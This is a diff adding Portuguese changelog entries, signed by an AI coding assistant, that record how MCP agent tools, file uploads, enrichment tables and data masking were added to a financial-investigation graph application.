+`pyproject.toml`) em `api/graphlagoon/mcp/server.py`, montado em
+`{api_prefix}/mcp` quando `agents_enabled`, com ferramentas de leitura
+(`list_investigations`, `get_investigation`, `get_graph`, `search_entities`,
+`get_entity`, `list_events`, `list_notes`, `list_artifacts`, `get_artifact`,
+`list_proposals`), escrita (`create_investigation`, `add_source`, `add_note`,
+`upload_artifact`) e `propose`, mais os resources `investigation://{id}/summary`
+e `investigation://{id}/events`.
+
+**Design Decisions:**
+1. **SDK 2.x:** o `FastMCP` virou `mcp.server.mcpserver.MCPServer` no `mcp` 2
+   (instalado 2.3.0); usamos ele e declaramos `mcp>=2.0` (extra `mcp`, `all` e
+   `dev`, para o teste rodar no CI). Sem o pacote, `mount_mcp` só avisa no log.
+2. **Transporte:** Streamable HTTP **stateless** com respostas JSON (sem sessão em
+   memória, funciona com vários workers). Rota exata `{prefix}/mcp` registrada antes
+   do catch-all do frontend; o `run()` do session manager entra no lifespan dos dois
+   apps (`mcp_lifespan`). Proteção de DNS rebinding desligada: autenticação é Bearer.
+3. **Diferença do plano:** o caminho é `/graphlagoon/mcp` no `create_app` (as rotas da
+   API vivem sob `/graphlagoon`), `/mcp` no `create_mountable_app`. A T11 passou a
+   mostrar a URL absoluta (antes saía relativa).
+4. **Identidade:** um endpoint ASGI aceita só token de agente (401 sem ele). Sob o
+   `AuthMiddleware` o token já vem resolvido e com limite de taxa; sem ele (app
+   montado) o endpoint resolve via `authenticate_agent` (extraído do middleware).
+   Cada ferramenta lê o ator do request, checa o escopo (`read`/`write`/`propose`),
+   põe o ator na `ContextVar` e chama o serviço como o dono: diário e auditoria saem
+   "agente X por Y". `create_investigation` checa `investigation.create`.
+5. **Mascaramento** (padrão, `agents_allow_unmasked_data=false`): CPF e CNPJ por
+   regex em qualquer string (`***.456.789-**`, `**.345.678/****-**`), campos com nome
+   de conta/agência (só os 2 últimos dígitos), e os valores de chave de identidade
+   `account` do caso (também dentro do id unificado). Um id mascarado que o agente
+   devolve (`get_entity`, nota ancorada, proposta de papel) volta ao id real
+   procurando no grafo do caso; ambíguo → erro. A busca compara o texto mascarado
+   (sem oráculo de CPF). Tudo sai em `{"untrusted_data": …}`.
+6. **Grafo do caso no servidor:** porte do `unifyGraph`/`identityKeys` do frontend
+   (fontes legíveis; restritas só contadas). `shortcut:` sem conflitos por
+   propriedade e sem fixture de paridade com o vitest; fazer na F3.8.
+7. Toda ferramenta de leitura grava `agent.read` na auditoria (com `tool` e o
+   agente), fechando o pendente da FA.1. `shortcut:` conteúdo binário de artefato sai
+   sem máscara.
+8. Fora do MVP: prompts (FA.7), `lookup_enrichment`/análises (F2/F3/F4), ferramenta
+   de editar título/descrição, tool annotations.
+
+**Files:** `api/graphlagoon/mcp/__init__.py`, `api/graphlagoon/mcp/server.py` (novos),
+`app.py`, `middleware/auth.py`, `services/audit.py`, `api/pyproject.toml`;
+`api/tests/test_mcp_server.py` (novo); `frontend/src/views/InvestigationAgentsView.vue`,
+`frontend/src/utils/adminView.ts`.
+
+**Testing:** `test_mcp_server.py` com o cliente do SDK via Streamable HTTP (httpx2
+ASGI): roteiro criar caso → fonte → grafo → nota → artefato → proposta de papel, tudo
+no diário como agente; CPF e conta mascarados e a proposta gravada com o id real;
+escopo `read` não escreve; sem token 401. Mais registry, tokens, auditoria,
+artefatos, propostas e investigações (72 verdes); vitest da T11.
+
+**Public Docs:** `docs/guide/configuration.md` (AI agents: endpoint MCP e comando
+`claude mcp add`). **Admin-Area Impact:** ação de auditoria `agent.read` (descrita no
+admin como "MCP <tool>"); sem rota, tabela ou setting novos.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 11:45] - Feature Implemented: FA.6 · Registry de cobertura AI-first
+
+**Feature:** `api/graphlagoon/mcp/registry.py` com `AGENT_TOOL_ROUTES` (rota →
+ferramenta MCP) e `AGENT_EXEMPT_ROUTES` (rota → motivo), e
+`api/tests/test_agent_registry.py`, que torna obrigatória a regra AI-first para
+F2–F4.
+
+**Design Decisions:**
+1. Chave `(método, caminho)`, como o `AUDIT_EXEMPT_ROUTES` do admin. Motivo que
+   começa com `human-only:` marca rota só humana; os demais são exceções com
+   justificativa (PATCH do caso e do `state` → `propose`; `POST …/events` são
+   análises do cliente; remover fonte, editar e apagar nota ficam com pessoas).
+2. Cobertos: `routers/investigations.py` e `/api/agent-tokens` (criar/revogar token é
+   só humano, 03 §8.7). As rotas de enriquecimento entram em `COVERED_ROUTERS` na F2.1.
+3. O teste falha quando: rota sem ferramenta nem motivo, entrada de rota que não
+   existe mais, ferramenta registrada que o servidor MCP não tem, ferramenta com nome
+   de ação só humana (delete/share/approve/accept/…), rota só humana sem
+   `forbid_agents` ou rota com `forbid_agents` não registrada como só humana, e — ao
+   vivo — rota só humana que não devolve 403 `AGENT_FORBIDDEN` a um token com todos
+   os escopos de um superusuário.
+4. Decisão e exportações oficiais (`format=siscoaf|simba`) entram como só humanas
+   quando a F4.5/F4.6 criarem as rotas.
+
+**Files:** `api/graphlagoon/mcp/registry.py`, `api/tests/test_agent_registry.py` (novos).
+
+**Testing:** `test_agent_registry.py` (4 verdes); conferido que falha ao tirar uma
+rota do registry e ao marcar como só humana uma rota sem `forbid_agents`.
+
+**Public Docs:** No public docs impact. **Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 12:30] - Feature Implemented: FA.5 · Ponte MCP local (stdio)
+
+**Feature:** `graphlagoon mcp-bridge --url <app> [--token glt_…]`, um servidor MCP
+stdio que repassa cada mensagem ao `/mcp` remoto (Streamable HTTP). CLI consertado:
+`graphlagoon` e `graphlagoon serve` sobem `graphlagoon.main:app` (antes `src.app:app`).
+
+**Design Decisions:**
+1. **Proxy de mensagens, não de ferramentas:** o bridge liga o `stdio_server` ao
+   `streamable_http_client` do SDK e bombeia `SessionMessage` nos dois sentidos.
+   Ferramentas, resources e prompts vêm do servidor sem duplicar nada; sai quando o
+   stdin fecha.
+2. **URL:** `--url` é a URL do app; acrescenta `/graphlagoon/mcp` se não terminar em
+   `/mcp`. Token por `--token` ou `GRAPHLAGOON_AGENT_TOKEN` (para `claude mcp add -e`).
+3. **Databricks:** com `databricks-sdk` instalado e um perfil que resolve
+   (`Config()`), o `Authorization` leva o OAuth do SDK (renovado a cada request) e o
+   `glt_` vai em `X-Graphlagoon-Agent-Token`, que o `AuthMiddleware` passou a aceitar.
+   Suposição não validada contra um proxy real do Databricks Apps: que ele repassa
+   esse cabeçalho.
+4. **Bug achado:** o `main.py` (o que o `make dev` roda) não delegava o lifespan do
+   app montado, então o `/mcp` respondia 500 ("Task group is not initialized") e as
+   migrações não rodavam no startup. Agora delega, como o `integration.md` manda.
+5. Fora do MVP: opção de desligar o OAuth, autenticação interativa, logs do bridge.
+
+**Files:** `api/graphlagoon/cli.py`, `api/graphlagoon/middleware/auth.py`,
+`api/graphlagoon/main.py`, `api/tests/test_cli.py` (novo), `docs/guide/configuration.md`.
+
+**Testing:** `test_cli.py` (serve aponta para o app empacotado; URL e cabeçalhos; o
+bridge com pipes em memória lista as ferramentas e cria um caso, com e sem o OAuth
+do Databricks) mais `test_mcp_server`, `test_agent_tokens`, `test_agent_registry`
+(18 verdes). Manual: `graphlagoon serve` + cliente stdio do SDK rodando
+`graphlagoon mcp-bridge --url http://localhost:8765` (lista ferramentas, cria caso).
+O `claude` CLI não está neste ambiente.
+
+**Public Docs:** `docs/guide/configuration.md` (AI agents: ponte local).
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 13:15] - Feature Implemented: FA.7 · Guia público de agentes, prompts MCP e E2E
+
+**Feature:** guia `docs/guide/agents-mcp.md` (TL;DR; Claude Code via HTTP, Claude
+Desktop e Databricks via ponte stdio, escopos, o que agentes nunca fazem,
+mascaramento, prompts, revisão), entrada no sidebar e links a partir de
+`investigations.md` e `configuration.md`; prompts MCP `investigar_golpe_pix`,
+`revisar_lojista` e `montar_dossie`; E2E do agente na T11/T10. Fecha a fase FA.
+
+**Design Decisions:**
+1. **Prompts** são roteiros numerados (fluxos A, B e D do 02-design) com o id do
+   caso como argumento e as regras de §8.1 no fim. `shortcut:` citam só as
+   ferramentas que existem hoje; `trace_money`, `lookup_enrichment`, `pin_evidence` e
+   `get_dossier` entram nos roteiros quando a F2–F4 criarem as ferramentas.
+2. **E2E com atalho:** o lado do agente (`upload_artifact` + `propose`) é semeado
+   como o estado de API que ele produz (artefato de autor agente + proposta
+   pendente), sem cliente MCP real no Playwright. A pessoa aceita na T11 (a rota
+   `accept` é chamada e a proposta some) e vê o artefato do agente na T10. O caminho
+   MCP real é coberto por `test_mcp_server.py` e `test_cli.py`.
+3. README do pacote: status diz F1 e FA concluídas; próxima F2.
+
+**Files:** `api/graphlagoon/mcp/server.py`, `api/tests/test_mcp_server.py`,
+`docs/guide/agents-mcp.md` (novo), `docs/.vitepress/config.ts`,
+`docs/guide/investigations.md`, `docs/guide/configuration.md`,
+`frontend/e2e/tests/investigations.spec.ts`, `docs/dev/plans/investigation/README.md`.
+
+**Testing:** `test_mcp_server.py` (lista os 3 prompts e renderiza um) + `test_cli.py`
+(7 verdes); E2E `investigations.spec.ts` (6 verdes); `npx vitepress build` ok.
+
+**Public Docs:** `docs/guide/agents-mcp.md` novo, no sidebar após Investigations.
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 14:00] - Feature Implemented: F2.1 · Tabelas de enriquecimento no context
+
+**Feature:** `enrichment_tables` no context (03 §2.1): validação, gate de autor ao
+anexar, `POST /api/graph-contexts/{id}/enrichment/{name}/lookup`, ferramenta MCP
+`lookup_enrichment` e seção "Enrichment Tables" no formulário do context (T6).
+
+**Design Decisions:**
+1. `EnrichmentTable` valida no schema: nome slug único, `table` por
+   `qualified_from_dotted`, `key_column`/`columns` por `validate_identifier_part`
+   (1..50 colunas), `promote.id_column` ∈ `columns`; até 20 tabelas por context.
+2. **Gate:** só entradas novas ou alteradas (comparadas à versão armazenada
+   normalizada) exigem `context.create` (reuso de `require_permission(...)` dentro
+   do handler) e passam pelo `check_scope` de autor contra a allowlist mais os
+   schemas das tabelas de aresta/nó, **sem** as de enriquecimento (uma tabela não
+   abona a si mesma). Remover ou salvar sem mudar não exige nada. Fora → 403
+   `ENRICHMENT_SCOPE_DENIED`.
+3. `context_tables()` inclui as tabelas de enriquecimento: o SQL livre de um leitor
+   pode lê-las (escopo ampliado de propósito, é o que o aviso da T6 diz).
+4. Consulta em `services/enrichment.py`: `SELECT <chave>, <colunas> … WHERE <chave>
+   IN (:k0, …) LIMIT max_rows+1`, chaves como parâmetros nomeados STRING, deduplicadas,
+   1..200 caracteres; settings novos `enrichment_max_keys` (500) e
+   `enrichment_max_rows` (5000, além disso `truncated`). Resposta agrupada por chave,
+   cada linha só com `columns`. Acesso de leitura = `get_context_with_access`.
+5. Auditoria `enrichment.read` (em `AUDITED_ROUTES`, descrita no `adminView.ts`).
+6. **MCP:** `lookup_enrichment(investigation_id, uid, table)` resolve a entidade
+   (id mascarado aceito), acha a fonte cujo context tem a tabela para o tipo do nó,
+   tira a chave (id do nó ou propriedade) e chama o mesmo `run_enrichment_lookup` da
+   rota; saída mascarada. Rota no registry; `test_agent_registry` cobre as rotas
+   `/enrichment/` do router de contexts. Prompt `investigar_golpe_pix` cita a
+   ferramenta.
+7. Formulário: seção (o modal não tem abas) com aviso, linhas editáveis (listas em
+   texto separado por vírgula) e "promover a nós" opcional. Sem prévia com contas da
+   última exploração nem "usada em N investigações" (T6): fora do MVP.
+
+**Files:** `api/graphlagoon/models/schemas.py`, `services/enrichment.py` (novo),
+`services/sql_scope.py`, `routers/graph_contexts.py`, `mcp/server.py`,
+`mcp/registry.py`, `config.py`, `services/audit.py`, `routers/admin_registry.py`,
+`db/memory_store.py`; `frontend/src/components/GraphContextFormModal.vue`,
+`types/graph.ts`, `utils/adminView.ts`.
+
+**Testing:** novo `test_enrichment.py` (validação, injeção, chaves malformadas,
+limites, writer sem permissão, allowlist do autor, leitor consulta só colunas
+declaradas, auditoria), `test_sql_scope.py`, `test_mcp_server.py` (ferramenta com
+máscara), `test_agent_registry.py`, `test_admin_registry.py`; vitest do
+`GraphContextFormModal`. O caso de permissão ficou em `test_enrichment.py` em vez de
+`test_permission_routes.py` (mesmo fixture de grupos).
+
+**Public Docs:** `docs/guide/investigations.md` (Enrichment tables),
+`configuration.md` (dois settings), `agents-mcp.md` (escopo read).
+**Admin-Area Impact:** dois settings em `CONFIG_FIELD_KINDS` (public) e a ação de
+auditoria `enrichment.read`.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 14:45] - Feature Implemented: F2.2 · Aba de enriquecimento no inspector e "promover a nós"
+
+**Feature:** aba **Enrichment** no inspector do workspace (T2): tabelas de
+enriquecimento dos contexts do nó, propriedades em lote ("uma linha"), tabela com
+contagem de compartilhamento ("várias linhas") e "Promote … to … nodes".
+
+**Design Decisions:**
+1. Funções puras em `utils/enrichment.ts`: `enrichmentTargets` (tabelas dos contexts
+   das origens do nó que casam o tipo, uma por context+nome), `enrichmentKey` (id do
+   nó no context ou propriedade), `keyedNodes`, `promoteToNodes`.
+2. Cada tabela é consultada **uma vez para todos os nós do grafo** a que se aplica
+   (`shortcut:` só as 500 primeiras chaves, o padrão do servidor), quando a aba abre.
+   "Uma linha": colunas viram propriedades dos nós unificados e passam por
+   `patchNodeProperties` (redesenho); reaplicadas quando o grafo unificado é refeito.
+   "Várias linhas": tabela das linhas do nó, com "Shared by" (quantos nós do grafo
+   têm o mesmo valor da coluna de promoção) como agregado.
+3. **Promover** gera uma fonte derivada `derived:<sourceId>:<tabela>` no store da
+   investigação (como as expansões, em vez de injetar no graph store como
+   `similarity.injectEdges`), então sobrevive à troca de aba e unifica como qualquer
+   fonte: o nó-chave entra com seu id no context e se funde a si mesmo; nós e arestas
+   levam `properties.__derived = "enrichment:<tabela>"`. `baseSourceId` trata
+   `derived:` como a fonte de origem (anel e aba). Grava `nodes.promoted` no diário
+   (já permitido ao cliente) antes de adicionar. `shortcut:` nós promovidos vivem na
+   sessão; persistir com as evidências (F4.1).
+4. Sem o bloco de "arquivo do caso" do T2 (F2.6) nem o alerta de renda incompatível.
+
+**Files:** `frontend/src/components/investigation/EnrichmentTab.vue` (novo),
+`utils/enrichment.ts` (novo), `utils/unifyGraph.ts`, `stores/investigation.ts`,
+`services/api.ts` (`lookupEnrichment`, `postInvestigationEvent`),
+`views/InvestigationView.vue`, `utils/investigationEvents.ts`.
+
+**Testing:** `utils/__tests__/enrichment.test.ts` (alvos por tipo; promoção cria um
+Dispositivo ligando duas contas sem duplicar contas), `InvestigationView.test.ts`
+(aba consulta em lote, mostra linhas, promove e grava no diário); `unifyGraph.test.ts`;
+`vue-tsc` limpo.
+
+**Public Docs:** `docs/guide/investigations.md` (inspector e aba Enrichment).
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 15:30] - Feature Implemented: F2.3 · Upload de arquivos
+
+**Feature:** arquivos do caso com papel (`graph`, `enrichment`, `attachment`):
+`POST/GET /api/investigations/{id}/files` e `GET …/files/{fid}/content`, ferramentas
+MCP `upload_file`, `list_files` e `get_file`, seção **Files** no painel da esquerda
+(T2) com o botão de upload.
+
+**Design Decisions:**
+1. **Corpo bruto, não multipart** (o `python-multipart` não está instalado), como os
+   artefatos da FA.2: `filename` e `role` na query; `storage.receive` calcula o
+   sha256 em streaming num temporário e o `put` grava em `{id}/files/{sha256}`.
+   Mesmo conteúdo de novo: o blob é reaproveitado (`FileExistsError` ignorado) e
+   ganha linha própria, porque nome e papel podem mudar.
+2. Gate `investigation.upload` (catálogo novo) + escrita no caso; caso decidido é
+   só-leitura. Auditoria `investigation.file_upload` (rota em `AUDITED_ROUTES`) e
+   `investigation.file_read` na leitura do conteúdo (também pela ferramenta MCP);
+   upload vai para o diário (`file.uploaded`).
+3. Conteúdo sempre `attachment` + `application/octet-stream` + `nosniff`: dado do
+   caso nunca é renderizado.
+4. Settings `investigation_file_max_bytes` (200 MB, 413 `FILE_TOO_LARGE`) e
+   `investigation_max_working_edges` (50 000, o número da G4, responde Q5); os dois
+   vão no `/api/config`. `shortcut:` o teto ainda não é aplicado em lugar nenhum;
+   entra quando a F2.5 gerar grafo de arquivo.
+5. MCP: `upload_file` até `min(artifact_max_bytes, investigation_file_max_bytes)`,
+   checa `investigation.upload` do dono do token; `get_file` decodifica UTF-8 ou
+   Latin-1 (SIMBA) e devolve mascarado.
+6. Fora do MVP: download do arquivo na UI, upload em partes (Q3 segue aberta),
+   seed com arquivos.
+
+**Files:** `api/graphlagoon/services/investigation_files.py` (novo),
+`services/investigation_storage.py`, `routers/investigations.py`,
+`models/schemas.py`, `config.py`, `services/permission_catalog.py`,
+`services/audit.py`, `services/public_config.py`, `routers/admin_registry.py`,
+`mcp/server.py`, `mcp/registry.py`; `frontend/src/components/investigation/CaseFiles.vue`
+(novo), `SourcesPanel.vue` (slot `files`), `views/InvestigationView.vue`,
+`services/api.ts`, `types/investigation.ts`, `utils/adminView.ts`.
+
+**Testing:** novo `test_investigation_files.py` (hash = sha256 local, blob
+reaproveitado, papel inválido, leitor lê mas não sobe, auditoria e diário, 413),
+`test_permission_routes.py` (403 e `/api/config` sem a permissão), `test_mcp_server.py`
+(upload e leitura mascarada pelo agente), listas do catálogo em
+`test_permissions.py`/`test_admin_groups.py`; vitest `CaseFiles.test.ts` (botão some
+sem permissão, upload com papel); `vue-tsc` limpo.
+
+**Public Docs:** `investigations.md` (Case files), `permissions.md`
+(`investigation.upload`), `configuration.md` (dois settings), `agents-mcp.md`.
+**Admin-Area Impact:** dois settings em `CONFIG_FIELD_KINDS` (public), rota de
+upload em `AUDITED_ROUTES`, ações `investigation.file_upload`/`file_read` descritas
+no `adminView.ts`, permissão nova no catálogo.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 16:30] - Feature Implemented: F2.4 · Especificação de mapeamento e presets
+
+**Feature:** interpretador da spec de mapeamento de arquivo (03 §4) em Python
+(`services/file_mapping.py`, autoritativo) e TS (`utils/fileMapping.ts`, prévia),
+presets SIMBA v3.1 e QSA da Receita nos dois lados, sugestão de preset por cabeçalho e
+fixtures douradas compartilhadas.
+
+**Design Decisions:**
+1. **Semântica única**, escrita no docstring do módulo Python e seguida linha a linha
+   no TS: arquivo escolhido pelo glob (só `*`/`?`, sem caixa), células com trim,
+   parser próprio de linha com aspas (`""` escapa) em vez do `csv` do Python, para
+   os dois lados lerem igual; linha = `{"alias.COL": valor}`; joins são **left
+   joins** entre inputs (extrato sem ORIGEM_DESTINO continua e conta como "sem
+   contraparte"); cada escopo é lido linha a linha, nós e depois arestas; erro de
+   conversão descarta a linha inteira com o motivo; valor: string = coluna, objeto =
+   `col`/`concat` (sep `-`)/`template`, depois `convert` → `map` → `normalize`;
+   parte ausente → null; prop null omitida; id null ou vazio pula o nó; nós fundem
+   por id (primeiro tipo e primeira prop vencem); id de aresta repetido fica o
+   primeiro; sem id, `"{índice}:{escopo}:{linha}"`.
+2. `direction` aceita `"in"`/`"out"` ou `{col, valor: in|out}`; valor fora do mapa
+   descarta a linha (direção errada inverte o fluxo do dinheiro). `type` de nó é
+   literal; de aresta, literal ou expressão. `map` sem a chave mantém o valor bruto.
+   `date:<fmt>` com `dd`, `mm`, `yyyy` vira ISO `yyyy-mm-dd`. `header: false` usa
+   `columns` (o CSV aberto da Receita não tem cabeçalho).
+3. **Relatório** só com contagens (sem percentual, para não depender de
+   arredondamento entre linguagens): `rows_read`, `rows_discarded`, `discarded`
+   (20 primeiros), `unknown_nodes`, `edge_rows`, `without_counterpart`,
+   `missing_inputs`, `missing_columns`.
+4. Normalizadores: `utils/identityKeys.ts` e o `_normalize` do `mcp/server.py`
+   (mesma regra), sem cópia nova.
+5. **Presets** = o `spec.json` das fixtures `simba-mini` e `qsa-mini`; os testes dos
+   dois lados comparam preset e fixture, o que segura o espelho. SIMBA: EXTRATO ×
+   ORIGEM_DESTINO (Conta → Pessoa por CPF/CNPJ, agência 9999 → `Desconhecido` por
+   transação, tipo pelo `TIPO_LANCAMENTO`, C = entra, D = sai, centavos, ddmmaaaa)
+   mais TITULARES (Pessoa TITULAR da Conta). QSA: `;`, sem cabeçalho, sócio PJ por
+   CNPJ, sócio PF por `nome|CPF mascarado` (nunca chave), `SOCIO_DE` com
+   qualificação e data. Sugestão: todo input casa um arquivo pelo nome e tem as
+   colunas que a spec lê (sem cabeçalho: mesma quantidade de colunas).
+6. Decodificação (`latin-1`) fica fora do interpretador (recebe texto); o
+   `decode()` do Python e o `TextDecoder` da F2.5 fazem isso. Fixtures em ASCII.
+7. Fora do MVP: joins encadeados, sep em template, `truncated` pelo
+   `investigation_max_working_edges` (entra com a geração no servidor, F2.5).
+
+**Files:** `api/graphlagoon/services/file_mapping.py`, `file_mapping_presets.py`
+(novos); `frontend/src/utils/fileMapping.ts`, `fileMappingPresets.ts` (novos);
+`frontend/src/__tests__/fixtures/fileMapping/{simba-mini,qsa-mini,generico}/`.
+
+**Testing:** `api/tests/test_file_mapping.py` e
+`frontend/src/utils/__tests__/fileMapping.test.ts` rodam as 3 fixtures contra o mesmo
+`expected.json` (gerado pelo Python e revisado à mão), presets = fixtures, sugestão e
+operador desconhecido; `vue-tsc` limpo.
+
+**Public Docs:** No public docs impact (o usuário vê a spec com o assistente da F2.5).
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 17:30] - Feature Implemented: F2.5 · Datasource `file` e assistente (T4)
+
+**Feature:** `DatasourceType` ganha `"file"`; `POST /api/investigations/{id}/files/{fid}/context`
+gera o grafo no servidor (context `file` + exploração + fonte `kind: file`);
+`PATCH …/files/{fid}` guarda o mapeamento de um arquivo de enriquecimento (usado pela
+F2.6); assistente `FileImportWizard.vue` (T4) aberto por "Add file…" na seção Files.
+
+**Design Decisions:**
+1. **Onde mora o grafo:** no snapshot service, sob o id do context (formato snapshot);
+   a exploração ganha o mesmo grafo como snapshot, então o workspace, o MCP
+   (`case_graph`) e o "freeze" funcionam sem mudança. `FileDatasource` não consulta
+   nada: Cypher/SQL/tabela → 400 `DATASOURCE_UNSUPPORTED_OPERATION`; subgraph,
+   expand e fetch_nodes andam no grafo guardado. `GraphContextCreate` recusa `file`
+   (só a rota do caso cria). `available_datasource_types` não muda (não aparece no
+   seletor).
+2. **Teto:** `investigation_max_working_edges` é aplicado na geração: ficam as N
+   primeiras arestas, os nós que elas tocam e os nós que nunca tiveram aresta;
+   `report.truncated_edges` e o diário (`source.added`) dizem quantas caíram.
+3. Vários arquivos (SIMBA = 5): a rota recebe `file_ids` além do `fid`; cada um é
+   decodificado com o `encoding` do primeiro input cujo glob casa o nome. O arquivo
+   principal (o do primeiro input) guarda `mapping` e `context_id`; gerar de novo → 409.
+4. Identity keys do context derivadas do mapeamento: tipo de nó cujo id é
+   normalizado como `cpf_cnpj`/`account`/`phone`/`email` vira chave com
+   `entity = tipo` (espelho TS em `utils/fileImport.ts` para o passo 4).
+   `edge_semantics` do mapeamento vai para o context.
+5. Gate `investigation.upload` + escrita no caso nas duas rotas; sem auditoria própria
+   (`AUDIT_EXEMPT_ROUTES`: ficam no diário, `source.added` com arquivos/hash/totais e
+   `file.mapped`). MCP: `create_file_graph` (preset ou mapping) e `set_file_mapping`
+   no registry.
+6. Capability nova `supportsQuery` no front (false só para `file`): esconde o botão e o
+   painel do Query Console; copy "Case file" no `DATASOURCE_COPY`.
+7. **Assistente:** um modal com os 5 passos. Lê os arquivos no browser (sha256 local
+   via WebCrypto quando houver), detecta preset (`suggestPresets`), senão começa por
+   um spec genérico de duas colunas; a tabela coluna → vira → conversão é derivada do
+   spec, que é editado como JSON (`shortcut:` sem edição célula a célula); prévia de 3
+   arestas e painel de qualidade com o `interpretMapping` do TS. "Salvar mapeamento"
+   = nome no spec guardado na linha do arquivo (`shortcut:` sem biblioteca de presets
+   do usuário). Papel enrichment configura chave/colunas/tipos/`key_digits`; anexo
+   pula os passos 3–4. Um retry depois de falha na geração não sobe os arquivos de novo.
+8. `shortcut:` o context `file` é do autor; outro membro do caso vê a fonte como
+   restrita até o context ser compartilhado (compartilhar com o caso fica para depois).
+9. E2E não feito (caro para o ganho): vitest do assistente com o SIMBA mini real e
+   pytest do upload → grafo cobrem o fluxo.
+
+**Files:** `api/graphlagoon/services/datasource/file.py` (novo), `datasource/factory.py`,
+`models/schemas.py`, `services/investigation_files.py`, `routers/investigations.py`,
+`routers/admin_registry.py`, `mcp/server.py`, `mcp/registry.py`;
+`frontend/src/components/investigation/FileImportWizard.vue` (novo), `CaseFiles.vue`,
+`utils/fileImport.ts` (novo), `utils/fileMapping.ts` (exports), `utils/fileMappingPresets.ts`
+(`QSA_ENRICHMENT`), `composables/useDatasourceCapabilities.ts`, `views/GraphVisualizationView.vue`,
+`views/InvestigationView.vue`, `stores/investigation.ts` (`files`), `services/api.ts`,
+`types/{graph,investigation}.ts`, `utils/investigationEvents.ts`.
+
+**Testing:** `test_investigation_files.py` (SIMBA mini → fonte `file`, identity keys,
+snapshot com Desconhecido, cypher 400, expand, 409, leitor 403, create público 422;
+teto de arestas; mapeamento de enriquecimento 422/403), `test_mcp_server.py`
+(`set_file_mapping`), `test_agent_registry.py`, `test_admin_registry.py`; vitest
+`FileImportWizard.test.ts` (detecção, tabela, qualidade, identidade, geração com 5
+arquivos; JSON inválido bloqueia), `CaseFiles.test.ts`, `useDatasourceCapabilities.test.ts`;
+`vue-tsc` limpo.
+
+**Public Docs:** `docs/guide/investigations.md` (assistente e context de arquivo),
+`agents-mcp.md` (duas ferramentas).
+**Admin-Area Impact:** duas rotas em `AUDIT_EXEMPT_ROUTES` (diário do caso).
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 18:00] - Feature Implemented: F2.6 · Arquivo como enriquecimento do caso
+
+**Feature:** arquivo do caso com papel `enrichment` e mapeamento aparece na aba
+Enrichment do inspector (T2), junto por chave no browser, com a mesma UI de tabela da F2.2.
+
+**Design Decisions:**
+1. O mapeamento de enriquecimento é um `FileEnrichmentSpec` (não a spec de grafo):
+   `input` (delimitador, cabeçalho, colunas, encoding), `key_column`, `columns`,
+   `match_node_types`, `match_source` (`node_id` ou propriedade) e `key_digits`
+   opcional (chave do nó → só dígitos, N primeiros: CNPJ → CNPJ básico do QSA).
+   Validado no `PATCH …/files/{fid}` (F2.5); preset `QSA_ENRICHMENT` no assistente.
+2. Funções puras `fileEnrichmentKey`/`fileEnrichmentRows` em `utils/enrichment.ts`
+   (reusam `parseLine`/`columnsOf` do interpretador). A aba lê cada arquivo uma vez
+   (`GET …/content`, leitura auditada) e decodifica com o encoding da spec; só as
+   `columns` aparecem. Sempre "várias linhas"; `shortcut:` sem "promover a nós" nem
+   "Shared by" para arquivos.
+3. Escopo do caso: os arquivos vêm do `store.files` do caso aberto (movidos do
+   `CaseFiles` para o store na F2.5); nada vai para o context, então
+   `enrichmentTargets` e os contexts não veem o arquivo, e quem não lê o caso recebe
+   404 nas rotas de arquivo.
+
+**Files:** `frontend/src/utils/enrichment.ts`, `utils/fileImport.ts` (`decoderLabel`),
+`components/investigation/EnrichmentTab.vue`.
+
+**Testing:** vitest `EnrichmentTab.test.ts` (QSA mini enriquece o lojista por CNPJ com
+os sócios certos, sem consulta a context; Pessoa não casa; o arquivo não vira tabela de
+context); `test_investigation_files.py` (estranho ao caso: 404 na lista e no conteúdo);
+`vue-tsc` limpo.
+
+**Public Docs:** `docs/guide/investigations.md` (arquivo de enriquecimento).
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 18:30] - Bug Fixed: F2.5 · Context de arquivo restrito para os outros membros do caso
+
+**Fix:** quem lê o caso lê o context `file` gerado nele (regra em
+`utils/context_access.py` → `reads_case_of_file_context`, checada na leitura, então vale
+para membros adicionados depois; sem compartilhamento copiado). O `GET
+/api/explorations/{id}` passa a cair no mesmo `get_context_with_access`. Fecha o
+`shortcut:` 8 da F2.5. Teste: `test_investigation_files.py::test_file_source_is_readable_by_case_members_added_later`.
+
+**Author:** Claude (AI Assistant)
+
+---
+
+## [2026-10-10 19:15] - Feature Implemented: F2.7 · Gravar valores de métricas como propriedade
+
+**Feature:** botão *Save as property* em cada métrica de nó (built-in e custom) do
+`MetricsPanel`; `graphStore.saveMetricAsProperty` grava os valores nas propriedades
+dos nós (`patchNodeProperties` com merge), salva o snapshot da exploração aberta
+(`buildGraphSnapshot`) e posta `metric.saved` no diário de cada caso que tem a
+exploração como fonte.
+
+**Design Decisions:**
+1. Propriedade = nome da métrica (sobrescreve se já existir). Só nós; métricas de
+   aresta ficam sem o botão (`shortcut:` sem patch de arestas, quando o rastreio pedir).
+2. Persistência imediata só com exploração aberta e com escrita; sem ela o valor vale
+   até o próximo "salvar" (o toast avisa).
+3. Casos achados por `GET /api/investigations?exploration_id=` (filtro novo na rota
+   existente; mesma ferramenta MCP `list_investigations`, sem rota nova); só casos com
+   escrita e não decididos recebem o evento (o POST de evento exige escrita).
+   `describeEvent` descreve `metric.saved`.
+
+**Files:** `frontend/src/stores/graph.ts`, `components/MetricsPanel.vue`,
+`services/api.ts`, `utils/investigationEvents.ts`; `api/graphlagoon/services/investigations.py`,
+`routers/investigations.py`.
+
+**Testing:** vitest `stores/__tests__/graph.saveMetricProperty.test.ts`,
+`MetricsPanel.custom.test.ts`; pytest `test_investigation_sources.py` (filtro por
+exploração); `vue-tsc` limpo.
+
